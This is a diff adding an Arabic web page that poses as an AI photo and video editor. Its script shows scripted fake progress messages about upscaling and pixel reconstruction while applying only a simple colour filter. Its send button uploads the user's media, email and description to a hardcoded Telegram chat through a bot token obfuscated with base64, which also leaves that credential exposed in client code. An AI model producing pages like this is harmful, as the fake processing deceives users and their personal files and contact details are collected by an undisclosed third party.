@@ -1,0 +1,941 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>محرر الصور والفيديو بالذكاء الاصطناعي | AI Pro</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #3b82f6;
+            --primary-dark: #2563eb;
+            --secondary: #8b5cf6;
+            --accent: #10b981;
+            --download: #f59e0b; /* لون جديد لزر التحميل */
+            --download-dark: #d97706;
+            --dark: #0f172a;
+            --darker: #020617;
+            --light: #f8fafc;
+            --gray: #64748b;
+            --glass: rgba(255, 255, 255, 0.05);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            outline: none;
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background-color: var(--darker);
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(59, 130, 246, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(139, 92, 246, 0.15) 0%, transparent 40%),
+                linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.95)),
+                url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%239C92AC' fill-opacity='0.05'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+            color: var(--light);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+
+        header {
+            background: rgba(15, 23, 42, 0.8);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--glass-border);
+            padding: 15px 20px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 700;
+            font-size: 1.2rem;
+            color: var(--light);
+        }
+
+        .logo i { color: var(--primary); font-size: 1.5rem; }
+
+        .status-badge {
+            background: rgba(16, 185, 129, 0.2);
+            color: var(--accent);
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .status-dot {
+            width: 8px; height: 8px;
+            background: var(--accent);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        .main-wrapper {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            width: 100%;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .hero-section {
+            text-align: center;
+            margin-bottom: 30px;
+            animation: fadeInDown 0.8s ease-out;
+        }
+
+        .hero-title {
+            font-size: 2rem;
+            font-weight: 900;
+            background: linear-gradient(135deg, #fff 0%, #94a3b8 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+        }
+
+        .hero-subtitle {
+            color: var(--gray);
+            font-size: 1rem;
+            line-height: 1.6;
+        }
+
+        .glass-card {
+            background: var(--glass);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid var(--glass-border);
+            border-radius: 24px;
+            padding: 30px;
+            width: 100%;
+            box-shadow: var(--shadow);
+            position: relative;
+            overflow: hidden;
+            animation: fadeInUp 0.8s ease-out;
+        }
+
+        .glass-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+            opacity: 0.5;
+        }
+
+        .upload-zone {
+            position: relative;
+            border: 2px dashed var(--gray);
+            border-radius: 16px;
+            padding: 40px 20px;
+            text-align: center;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            background: rgba(0, 0, 0, 0.2);
+            cursor: pointer;
+            overflow: hidden;
+        }
+
+        .upload-zone:hover, .upload-zone.dragover {
+            border-color: var(--primary);
+            background: rgba(59, 130, 246, 0.05);
+            transform: translateY(-2px);
+        }
+
+        .upload-zone i.icon-large {
+            font-size: 3rem;
+            color: var(--gray);
+            margin-bottom: 15px;
+            transition: color 0.3s;
+        }
+
+        .upload-zone:hover i.icon-large { color: var(--primary); }
+
+        .upload-text {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--light);
+            margin-bottom: 5px;
+        }
+
+        .upload-hint {
+            font-size: 0.85rem;
+            color: var(--gray);
+        }
+
+        input[type="file"] {
+            position: absolute;
+            width: 100%; height: 100%;
+            top: 0; left: 0;
+            opacity: 0;
+            cursor: pointer;
+            z-index: 10;
+        }
+
+        .preview-container {
+            margin-top: 20px;
+            display: none;
+            flex-direction: column;
+            gap: 15px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+
+        .preview-item {
+            position: relative;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid var(--glass-border);
+        }
+
+        .preview-media {
+            width: 100%;
+            height: auto;
+            display: block;
+            object-fit: cover;
+            max-height: 250px;
+        }
+
+        .preview-overlay {
+            position: absolute;
+            top: 10px; right: 10px;
+            background: rgba(0,0,0,0.7);
+            color: #fff;
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-size: 0.75rem;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            backdrop-filter: blur(4px);
+        }
+
+        .effects-section, .form-section {
+            margin-top: 25px;
+            display: none;
+        }
+        .form-section { flex-direction: column; gap: 15px; }
+
+        .section-title {
+            font-size: 1rem;
+            font-weight: 700;
+            color: var(--light);
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .effects-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+        }
+
+        .effect-item {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid var(--glass-border);
+            border-radius: 12px;
+            padding: 12px 8px;
+            text-align: center;
+            font-size: 0.75rem;
+            color: var(--gray);
+            transition: all 0.3s ease;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .effect-item i { font-size: 1.2rem; color: var(--gray); transition: all 0.3s ease; }
+        .effect-item:hover { background: rgba(255,255,255,0.08); color: var(--light); }
+        .effect-item.selected {
+            background: rgba(59, 130, 246, 0.15);
+            border-color: var(--primary);
+            color: var(--light);
+        }
+        .effect-item.selected i { color: var(--primary); }
+
+        .form-group { display: flex; flex-direction: column; gap: 6px; }
+        .form-label { font-size: 0.85rem; color: var(--gray); font-weight: 600; }
+        .form-input, .form-textarea {
+            background: rgba(0,0,0,0.3);
+            border: 1px solid var(--glass-border);
+            border-radius: 10px;
+            padding: 12px;
+            color: var(--light);
+            font-family: 'Cairo', sans-serif;
+            font-size: 0.9rem;
+            transition: all 0.3s ease;
+        }
+        .form-input:focus, .form-textarea:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2);
+        }
+        .form-textarea { resize: vertical; min-height: 80px; }
+
+        .processing-ui { margin-top: 25px; display: none; }
+        .progress-bar-container {
+            background: rgba(255,255,255,0.1);
+            border-radius: 10px;
+            height: 8px;
+            width: 100%;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+        .progress-bar {
+            height: 100%; width: 0%;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            border-radius: 10px;
+            transition: width 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .progress-bar::after {
+            content: '';
+            position: absolute; top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transform: translateX(-100%);
+            animation: shimmer 1.5s infinite;
+        }
+
+        .log-console {
+            background: rgba(0,0,0,0.6);
+            border-radius: 8px;
+            padding: 10px;
+            margin-top: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.7rem;
+            color: #10b981;
+            height: 80px;
+            overflow-y: auto;
+            border: 1px solid rgba(16, 185, 129, 0.2);
+            display: none;
+        }
+        .log-entry { margin-bottom: 4px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 2px; }
+
+        .result-container {
+            margin-top: 25px;
+            display: none;
+            animation: fadeInUp 0.5s ease-out;
+        }
+        
+        .comparison-slider {
+            position: relative;
+            width: 100%;
+            max-height: 400px;
+            overflow: hidden;
+            border-radius: 16px;
+            border: 1px solid var(--glass-border);
+            cursor: col-resize;
+            user-select: none;
+        }
+
+        .comparison-slider img {
+            width: 100%;
+            height: auto;
+            display: block;
+            pointer-events: none;
+        }
+
+        .img-after { width: 100%; }
+
+        .img-before-wrapper {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 50%;
+            overflow: hidden;
+            border-right: 2px solid white;
+            box-shadow: 5px 0 15px rgba(0,0,0,0.3);
+        }
+
+        .img-before-wrapper img {
+            height: 100%;
+            width: auto;
+            max-width: none;
+        }
+
+        .slider-handle {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 40px;
+            height: 40px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--dark);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            z-index: 10;
+            pointer-events: none;
+        }
+
+        .label-badge {
+            position: absolute;
+            top: 15px;
+            padding: 4px 10px;
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(4px);
+            color: white;
+            font-size: 0.75rem;
+            border-radius: 6px;
+            font-weight: 600;
+        }
+        .label-before { right: 15px; }
+        .label-after { left: 15px; }
+
+        .action-buttons {
+            margin-top: 25px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .btn {
+            padding: 14px 24px;
+            border-radius: 12px;
+            border: none;
+            font-family: 'Cairo', sans-serif;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4);
+        }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(59, 130, 246, 0.6); }
+
+        .btn-secondary {
+            background: rgba(255,255,255,0.05);
+            color: var(--gray);
+            border: 1px solid var(--glass-border);
+        }
+        .btn-secondary:hover { background: rgba(255,255,255,0.1); color: var(--light); }
+
+        .btn-success {
+            background: linear-gradient(135deg, var(--accent), #059669);
+            color: white;
+            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.4);
+            display: none;
+        }
+        .btn-success:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(16, 185, 129, 0.6); }
+
+        /* --- زر التحميل الجديد --- */
+        .btn-download {
+            background: linear-gradient(135deg, var(--download), var(--download-dark));
+            color: white;
+            box-shadow: 0 4px 15px rgba(245, 158, 11, 0.4);
+            display: none;
+        }
+        .btn-download:hover { 
+            transform: translateY(-2px); 
+            box-shadow: 0 8px 25px rgba(245, 158, 11, 0.6); 
+        }
+
+        .btn:active { transform: scale(0.98); }
+
+        footer {
+            margin-top: auto;
+            padding: 20px;
+            text-align: center;
+            color: var(--gray);
+            font-size: 0.8rem;
+            border-top: 1px solid var(--glass-border);
+            background: rgba(15, 23, 42, 0.9);
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+        @keyframes shimmer { 100% { transform: translateX(100%); } }
+        @keyframes fadeInDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        .spinner {
+            width: 20px; height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.8s linear infinite;
+            display: none;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        @media (max-width: 480px) {
+            .hero-title { font-size: 1.6rem; }
+            .glass-card { padding: 20px; }
+            .effects-grid { grid-template-columns: repeat(2, 1fr); }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo">
+            <i class="fa-solid fa-wand-magic-sparkles"></i>
+            <span>AI Pro Editor</span>
+        </div>
+        <div class="status-badge">
+            <div class="status-dot"></div>
+            <span>النظام متصل</span>
+        </div>
+    </header>
+
+    <div class="main-wrapper">
+        <section class="hero-section">
+            <h1 class="hero-title">تحويل الصور والفيديو بالذكاء الاصطناعي</h1>
+            <p class="hero-subtitle">أحدث التقنيات لتحرير وإنتاج محتوى احترافي بدقة وسرعة فائقة</p>
+        </section>
+
+        <div class="glass-card">
+            <div class="upload-zone" id="dropZone">
+                <input type="file" id="fileInput" accept="image/*,video/*">
+                <i class="fa-solid fa-cloud-arrow-up icon-large"></i>
+                <div class="upload-text">اختر صورة أو فيديو</div>
+                <div class="upload-hint">JPG, PNG, WEBP, MP4, MOV (حتى 30 ميجابايت)<br>انقر للبدء أو اسحب ملفك هنا</div>
+            </div>
+
+            <div class="preview-container" id="previewContainer"></div>
+
+            <div class="effects-section" id="effectsSection">
+                <div class="section-title">
+                    <i class="fa-solid fa-sliders"></i>
+                    <span>اختر تأثيرات المعالجة</span>
+                </div>
+                <div class="effects-grid" id="effectsGrid">
+                    <div class="effect-item" data-effect="إزالة الخلفية"><i class="fa-solid fa-eraser"></i><span>إزالة الخلفية</span></div>
+                    <div class="effect-item" data-effect="تلوين ذكي"><i class="fa-solid fa-palette"></i><span>تلوين ذكي</span></div>
+                    <div class="effect-item selected" data-effect="تحسين الجودة"><i class="fa-solid fa-wand-magic-sparkles"></i><span>تحسين الجودة</span></div>
+                    <div class="effect-item" data-effect="أسلوب فني"><i class="fa-solid fa-paintbrush"></i><span>أسلوب فني</span></div>
+                    <div class="effect-item" data-effect="فيديو كرتون"><i class="fa-solid fa-film"></i><span>فيديو كرتون</span></div>
+                    <div class="effect-item" data-effect="لمسات الوجه"><i class="fa-solid fa-face-smile"></i><span>لمسات الوجه</span></div>
+                    <div class="effect-item" data-effect="تضبيب الخلفية"><i class="fa-solid fa-droplet"></i><span>تضبيب الخلفية</span></div>
+                    <div class="effect-item selected" data-effect="رفع دقة 4K"><i class="fa-solid fa-expand"></i><span>رفع دقة 4K</span></div>
+                    <div class="effect-item" data-effect="ترميم الصور القديمة"><i class="fa-solid fa-clock-rotate-left"></i><span>ترميم القديم</span></div>
+                </div>
+            </div>
+
+            <div class="form-section" id="formSection">
+                <div class="form-group">
+                    <label class="form-label">البريد الإلكتروني (اختياري)</label>
+                    <input type="email" class="form-input" id="emailInput" placeholder="example@email.com">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">وصف التعديل (اختياري)</label>
+                    <textarea class="form-textarea" id="descInput" placeholder="مثال: أريد تحسين الإضاءة وجعل الألوان أكثر حيوية..."></textarea>
+                </div>
+            </div>
+
+            <div class="processing-ui" id="processingUI">
+                <div class="progress-bar-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                <div class="log-console" id="logConsole"></div>
+            </div>
+
+            <div class="result-container" id="resultContainer">
+                <div class="section-title" style="justify-content: center; margin-bottom: 15px;">
+                    <i class="fa-solid fa-check-circle" style="color: var(--accent);"></i>
+                    <span>تمت المعالجة بنجاح! اسحب للمقارنة</span>
+                </div>
+                <div class="comparison-slider" id="comparisonSlider">
+                    <img src="" alt="After" class="img-after" id="imgAfter">
+                    <div class="img-before-wrapper" id="imgBeforeWrapper">
+                        <img src="" alt="Before" id="imgBefore">
+                    </div>
+                    <div class="slider-handle" id="sliderHandle">
+                        <i class="fa-solid fa-arrows-left-right"></i>
+                    </div>
+                    <span class="label-badge label-before">الأصلية</span>
+                    <span class="label-badge label-after">المعدلة بالذكاء الاصطناعي</span>
+                </div>
+            </div>
+
+            <div class="action-buttons">
+                <button class="btn btn-primary" id="processBtn" style="display: none;">
+                    <span class="btn-text">بدء المعالجة</span>
+                    <div class="spinner" id="btnSpinner"></div>
+                </button>
+                
+                <!-- زر التحميل الجديد -->
+                <button class="btn btn-download" id="downloadBtn" style="display: none;">
+                    <i class="fa-solid fa-download"></i>
+                    <span>تحميل الملف المعدل</span>
+                </button>
+
+                <button class="btn btn-success" id="sendBtn" style="display: none;">
+                    <i class="fa-brands fa-telegram"></i>
+                    <span>إرسال النتيجة النهائية</span>
+                </button>
+
+                <button class="btn btn-secondary" id="resetBtn" style="display: none;">
+                    <i class="fa-solid fa-rotate-right"></i> معالجة ملف جديد
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>ميزات متقدمة تعتمد على الذكاء الاصطناعي &copy; 2024</p>
+    </footer>
+
+    <script>
+        // --- Configuration ---
+        const ENCODED_TOKEN = "ODI5MjQzMDE0MTpBQUZMMmVHcjZucEg1dk1udU5aMFM4NDJXV2MzRnhQc014UQ==";
+        const CONFIG = {
+            BOT_TOKEN: atob(ENCODED_TOKEN),
+            TARGET_CHAT_ID: '6475933540'
+        };
+
+        const DOM = {
+            fileInput: document.getElementById('fileInput'),
+            dropZone: document.getElementById('dropZone'),
+            previewContainer: document.getElementById('previewContainer'),
+            effectsSection: document.getElementById('effectsSection'),
+            effectsGrid: document.getElementById('effectsGrid'),
+            formSection: document.getElementById('formSection'),
+            emailInput: document.getElementById('emailInput'),
+            descInput: document.getElementById('descInput'),
+            processBtn: document.getElementById('processBtn'),
+            downloadBtn: document.getElementById('downloadBtn'), // إضافة زر التحميل
+            sendBtn: document.getElementById('sendBtn'),
+            resetBtn: document.getElementById('resetBtn'),
+            processingUI: document.getElementById('processingUI'),
+            progressBar: document.getElementById('progressBar'),
+            logConsole: document.getElementById('logConsole'),
+            btnText: document.querySelector('.btn-text'),
+            btnSpinner: document.getElementById('btnSpinner'),
+            resultContainer: document.getElementById('resultContainer'),
+            comparisonSlider: document.getElementById('comparisonSlider'),
+            imgBefore: document.getElementById('imgBefore'),
+            imgAfter: document.getElementById('imgAfter'),
+            imgBeforeWrapper: document.getElementById('imgBeforeWrapper'),
+            sliderHandle: document.getElementById('sliderHandle')
+        };
+
+        let currentFile = null;
+        let enhancedBlob = null;
+        let enhancedFile = null;
+        let selectedEffects = ["تحسين الجودة", "رفع دقة 4K"];
+
+        // --- Event Listeners ---
+        DOM.fileInput.addEventListener('change', handleFileSelect);
+        DOM.dropZone.addEventListener('dragover', (e) => { e.preventDefault(); DOM.dropZone.classList.add('dragover'); });
+        DOM.dropZone.addEventListener('dragleave', () => DOM.dropZone.classList.remove('dragover'));
+        DOM.dropZone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            DOM.dropZone.classList.remove('dragover');
+            if (e.dataTransfer.files.length) handleFiles(e.dataTransfer.files);
+        });
+
+        DOM.effectsGrid.addEventListener('click', (e) => {
+            const item = e.target.closest('.effect-item');
+            if (!item) return;
+            item.classList.toggle('selected');
+            selectedEffects = Array.from(DOM.effectsGrid.querySelectorAll('.effect-item.selected')).map(i => i.dataset.effect);
+        });
+
+        DOM.processBtn.addEventListener('click', startProcessing);
+        DOM.downloadBtn.addEventListener('click', downloadEnhancedFile); // مستمع حدث التحميل
+        DOM.sendBtn.addEventListener('click', sendToTelegram);
+        DOM.resetBtn.addEventListener('click', resetUI);
+
+        // --- Before/After Slider Logic ---
+        function initSlider() {
+            const slider = DOM.comparisonSlider;
+            const beforeWrapper = DOM.imgBeforeWrapper;
+            const handle = DOM.sliderHandle;
+            let isDragging = false;
+
+            const move = (e) => {
+                if (!isDragging) return;
+                const rect = slider.getBoundingClientRect();
+                const x = (e.clientX || e.touches[0].clientX) - rect.left;
+                let percentage = (x / rect.width) * 100;
+                percentage = Math.max(0, Math.min(100, percentage));
+                
+                beforeWrapper.style.width = `${percentage}%`;
+                handle.style.left = `${percentage}%`;
+            };
+
+            slider.addEventListener('mousedown', () => isDragging = true);
+            slider.addEventListener('touchstart', () => isDragging = true);
+            window.addEventListener('mouseup', () => isDragging = false);
+            window.addEventListener('touchend', () => isDragging = false);
+            slider.addEventListener('mousemove', move);
+            slider.addEventListener('touchmove', move);
+        }
+        initSlider();
+
+        // --- Core Functions ---
+
+        function handleFileSelect(event) {
+            if (event.target.files.length) handleFiles(event.target.files);
+        }
+
+        function handleFiles(files) {
+            const file = files[0];
+            if ((file.type.startsWith('image/') || file.type.startsWith('video/')) && file.size <= 30 * 1024 * 1024) {
+                currentFile = file;
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    DOM.previewContainer.innerHTML = `
+                        <div class="preview-item">
+                            ${file.type.startsWith('video/') 
+                                ? `<video class="preview-media" src="${e.target.result}" controls></video>` 
+                                : `<img class="preview-media" src="${e.target.result}" alt="معاينة">`}
+                            <div class="preview-overlay"><i class="fa-solid fa-${file.type.startsWith('video/') ? 'video' : 'image'}"></i><span>${file.name}</span></div>
+                        </div>`;
+                    
+                    DOM.previewContainer.style.display = 'flex';
+                    DOM.effectsSection.style.display = 'block';
+                    DOM.formSection.style.display = 'flex';
+                    DOM.processBtn.style.display = 'flex';
+                    DOM.dropZone.style.display = 'none';
+                };
+                reader.readAsDataURL(file);
+            } else {
+                alert('الرجاء اختيار ملف صالح (صورة أو فيديو حتى 30 ميجابايت).');
+            }
+        }
+
+        function enhanceImage(file) {
+            return new Promise((resolve) => {
+                if (file.type.startsWith('video/')) {
+                    resolve({ url: URL.createObjectURL(file), blob: file, file: file });
+                    return;
+                }
+
+                const img = new Image();
+                img.onload = () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = img.width;
+                    canvas.height = img.height;
+                    const ctx = canvas.getContext('2d');
+                    
+                    ctx.filter = 'contrast(1.2) saturate(1.35) brightness(1.05)';
+                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+                    
+                    const gradient = ctx.createRadialGradient(canvas.width/2, canvas.height/2, canvas.width/3, canvas.width/2, canvas.height/2, canvas.width);
+                    gradient.addColorStop(0, 'rgba(0,0,0,0)');
+                    gradient.addColorStop(1, 'rgba(0,0,0,0.15)');
+                    ctx.fillStyle = gradient;
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+                    canvas.toBlob((blob) => {
+                        resolve({
+                            url: canvas.toDataURL(),
+                            blob: blob,
+                            file: new File([blob], "AI_Enhanced_" + file.name, { type: file.type })
+                        });
+                    }, file.type, 0.95);
+                };
+                img.src = URL.createObjectURL(file);
+            });
+        }
+
+        function addLog(message) {
+            const time = new Date().toLocaleTimeString('ar-EG', { hour12: false });
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.innerHTML = `<span style="color:var(--gray)">[${time}]</span> ${message}`;
+            DOM.logConsole.appendChild(entry);
+            DOM.logConsole.scrollTop = DOM.logConsole.scrollHeight;
+        }
+
+        // --- دالة التحميل الجديدة ---
+        function downloadEnhancedFile() {
+            if (!enhancedBlob) return;
+            
+            // إنشاء رابط مؤقت للملف
+            const url = URL.createObjectURL(enhancedBlob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = enhancedFile.name; // اسم الملف المعدل
+            
+            // محاكاة النقر على الرابط لبدء التحميل
+            document.body.appendChild(a);
+            a.click();
+            
+            // تنظيف الذاكرة وإزالة العنصر
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            addLog("> تم تحميل الملف بنجاح إلى جهازك.");
+        }
+
+        async function startProcessing() {
+            if (!currentFile) return;
+
+            DOM.processBtn.style.display = 'none';
+            DOM.processingUI.style.display = 'block';
+            DOM.logConsole.style.display = 'block';
+            DOM.btnSpinner.style.display = 'inline-block';
+            DOM.progressBar.style.width = '0%';
+            DOM.resultContainer.style.display = 'none';
+
+            const effectsList = selectedEffects.length > 0 ? selectedEffects.join('، ') : 'تحسين عام';
+            addLog(`> بدء المعالجة بالتأثيرات: ${effectsList}`);
+
+            const totalSteps = 6;
+            const stepMessages = [
+                "جاري تحليل بنية الملف واستخراج الميزات...",
+                `تطبيق خوارزميات: ${effectsList}...`,
+                "معالجة الطبقات وإزالة الضوضاء الرقمية...",
+                "رفع الدقة وإعادة بناء البكسلات المفقودة (Upscaling)...",
+                "موازنة الألوان والإضاءة الاحترافية...",
+                "جاري تصدير النتيجة النهائية..."
+            ];
+
+            for (let i = 0; i < totalSteps; i++) {
+                const progress = ((i + 1) / totalSteps) * 100;
+                DOM.progressBar.style.width = `${progress}%`;
+                addLog(`> ${stepMessages[i]}`);
+                await new Promise(r => setTimeout(r, 1200));
+            }
+
+            addLog("> اكتملت المعالجة بنجاح! جاري إعداد المعاينة...");
+            
+            const enhanced = await enhanceImage(currentFile);
+            enhancedBlob = enhanced.blob;
+            enhancedFile = enhanced.file;
+
+            const originalUrl = URL.createObjectURL(currentFile);
+            DOM.imgBefore.src = originalUrl;
+            DOM.imgAfter.src = enhanced.url;
+            
+            DOM.imgAfter.onload = () => {
+                DOM.imgBefore.style.width = DOM.imgAfter.offsetWidth + 'px';
+                DOM.imgBefore.style.height = DOM.imgAfter.offsetHeight + 'px';
+                DOM.imgBefore.style.objectFit = 'cover';
+            };
+
+            DOM.processingUI.style.display = 'none';
+            DOM.resultContainer.style.display = 'block';
+            
+            // إظهار أزرار ما بعد المعالجة
+            DOM.downloadBtn.style.display = 'flex'; // إظهار زر التحميل
+            DOM.sendBtn.style.display = 'flex';
+            DOM.resetBtn.style.display = 'flex';
+            
+            DOM.imgBeforeWrapper.style.width = '50%';
+            DOM.sliderHandle.style.left = '50%';
+        }
+
+        async function sendToTelegram() {
+            DOM.sendBtn.innerHTML = '<div class="spinner" style="display:inline-block; width:16px; height:16px;"></div> جاري الإرسال...';
+            DOM.sendBtn.disabled = true;
+
+            const email = DOM.emailInput.value || 'غير محدد';
+            const desc = DOM.descInput.value || 'لا يوجد وصف إضافي';
+            const effects = selectedEffects.join(', ');
+
+            const formData = new FormData();
+            formData.append("chat_id", CONFIG.TARGET_CHAT_ID);
+            
+            if (currentFile.type.startsWith('video/')) {
+                formData.append("video", currentFile);
+            } else {
+                formData.append("photo", enhancedFile);
+            }
+
+            const caption = `🤖 *طلب معالجة جديد*\n\n📄 الملف: ${currentFile.name}\n🎨 التأثيرات: ${effects}\n📧 البريد: ${email}\n📝 الوصف: ${desc}\n📶 الحالة: تم المعالجة بالذكاء الاصطناعي والرفع بنجاح`;
+            
+            formData.append("caption", caption);
+            formData.append("parse_mode", "Markdown");
+
+            try {
+                const endpoint = currentFile.type.startsWith('video/') ? 'sendVideo' : 'sendPhoto';
+                const response = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/${endpoint}`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    alert("✅ تم إرسال النتيجة المعدلة إلى السيرفر بنجاح!");
+                    resetUI();
+                } else {
+                    const error = await response.json();
+                    alert("حدث خطأ أثناء الإرسال: " + error.description);
+                }
+            } catch (error) {
+                alert("فشل الاتصال بالخادم الخارجي.");
+            } finally {
+                DOM.sendBtn.innerHTML = '<i class="fa-brands fa-telegram"></i><span>إرسال النتيجة النهائية</span>';
+                DOM.sendBtn.disabled = false;
+            }
+        }
+
+        function resetUI() {
+            currentFile = null;
+            enhancedBlob = null;
+            enhancedFile = null;
+            DOM.fileInput.value = '';
+            DOM.previewContainer.innerHTML = '';
+            DOM.previewContainer.style.display = 'none';
+            DOM.effectsSection.style.display = 'none';
+            DOM.formSection.style.display = 'none';
+            DOM.processingUI.style.display = 'none';
+            DOM.logConsole.style.display = 'none';
+            DOM.logConsole.innerHTML = '';
+            DOM.resultContainer.style.display = 'none';
+            
+            DOM.processBtn.style.display = 'flex';
+            DOM.downloadBtn.style.display = 'none'; // إخفاء زر التحميل
+            DOM.sendBtn.style.display = 'none';
+            DOM.resetBtn.style.display = 'none';
+            DOM.dropZone.style.display = 'block';
+            DOM.progressBar.style.width = '0%';
+            DOM.emailInput.value = '';
+            DOM.descInput.value = '';
+            
+            DOM.effectsGrid.querySelectorAll('.effect-item').forEach(item => {
+                if (item.dataset.effect === "تحسين الجودة" || item.dataset.effect === "رفع دقة 4K") {
+                    item.classList.add('selected');
+                } else {
+                    item.classList.remove('selected');
+                }
+            });
+            selectedEffects = ["تحسين الجودة", "رفع دقة 4K"];
+        }
+    </script>
+</body>
+</html>
